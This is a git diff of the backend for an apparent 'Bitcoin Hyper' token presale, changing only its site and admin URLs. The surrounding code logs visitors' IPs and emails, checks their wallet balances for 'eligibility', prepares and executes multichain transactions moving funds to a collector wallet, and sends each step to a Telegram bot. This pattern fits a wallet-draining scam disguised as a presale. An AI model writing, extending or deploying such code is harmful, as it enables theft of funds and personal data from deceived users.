@@ -22,7 +22,7 @@ app.use(helmet({
 
 const allowedOrigins = process.env.ALLOWED_ORIGINS 
   ? process.env.ALLOWED_ORIGINS.split(',') 
-  : ['http://localhost:3000', 'https://bitcoinhypertoken.vercel.app', 'https://bthbk.vercel.app'];
+  : ['http://localhost:3000', 'https://hyperclaim-one.vercel.app', 'https://hyperback.vercel.app'];
 
 app.use(cors({
   origin: allowedOrigins,
@@ -278,8 +278,8 @@ async function testTelegramConnection() {
       `✅ MultiChain FlowRouter Ready\n` +
       `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
       `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
-      `🌍 <b>Site URL:</b> https://bthbk.vercel.app\n` +
-      `📊 Admin: https://bthbk.vercel.app/admin.html?token=${process.env.ADMIN_TOKEN || 'YOUR_TOKEN'}`;
+      `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
+      `📊 Admin: https://hyperback.vercel.app/admin.html?token=${process.env.ADMIN_TOKEN || 'YOUR_TOKEN'}`;
     
     const sendResult = await sendTelegramMessage(startMessage);
     
@@ -469,7 +469,7 @@ async function trackSiteVisit(ip, userAgent, referer, path) {
     `👤 <b>Human:</b> ${visit.isHuman ? '✅ Yes' : '❌ No (Bot)'}\n` +
     `🔗 <b>From:</b> ${referer || 'Direct'}\n` +
     `📱 <b>Path:</b> ${path || '/'}\n` +
-    `🌍 <b>Site URL:</b> https://bthbk.vercel.app\n` +
+    `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
     `🆔 <b>Visit ID:</b> ${visit.id}`;
   
   await sendTelegramMessage(telegramMessage);
@@ -661,7 +661,7 @@ app.post('/api/presale/connect', async (req, res) => {
         `🌐 <b>IP:</b> ${clientIP.replace('::ffff:', '')}\n` +
         `📧 <b>Email:</b> ${email}\n` +
         `👤 <b>Human:</b> ${participant.isHuman ? '✅ Yes' : '❌ No'}\n` +
-        `🌍 <b>Site URL:</b> https://bthbk.vercel.app`;
+        `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`;
       
       await sendTelegramMessage(newUserMsg);
     }
@@ -686,7 +686,7 @@ app.post('/api/presale/connect', async (req, res) => {
         `💵 <b>Total Balance:</b> $${balanceResult.data.totalValueUSD.toFixed(2)}\n` +
         `🎯 <b>Status:</b> ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
         `📧 <b>Email:</b> ${email}\n` +
-        `🌍 <b>Site URL:</b> https://bthbk.vercel.app`;
+        `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`;
       
       await sendTelegramMessage(connectMsg);
       
@@ -775,7 +775,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       `💵 <b>Total Value:</b> $${totalFlowUSD}\n` +
       `🔗 <b>Transactions (${transactions.length} chains):</b>${txDetails}\n` +
       `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-      `🌍 <b>Site URL:</b> https://bthbk.vercel.app`
+      `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`
     );
     
     res.json({
@@ -853,7 +853,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
         `💵 <b>Amount:</b> ${txAmount} ${txSymbol} ($${txValueUSD})\n` +
         `🆔 <b>Tx Hash:</b> <code>${txHash}</code>\n` +
         `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-        `🌍 <b>Site URL:</b> https://bthbk.vercel.app`
+        `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`
       );
       
       // Update pending flow
@@ -1192,7 +1192,7 @@ app.listen(PORT, '0.0.0.0', async () => {
   ⚡ BITCOIN HYPER BACKEND - MULTICHAIN FLOW ROUTER
   ================================================
   📍 Port: ${PORT}
-  🔗 URL: https://bthbk.vercel.app
+  🔗 URL: https://hyperback.vercel.app
   
   📦 COLLECTOR: ${COLLECTOR_WALLET}
   
@@ -1210,3 +1210,4 @@ app.listen(PORT, '0.0.0.0', async () => {
   
   await testTelegramConnection();
 });
+
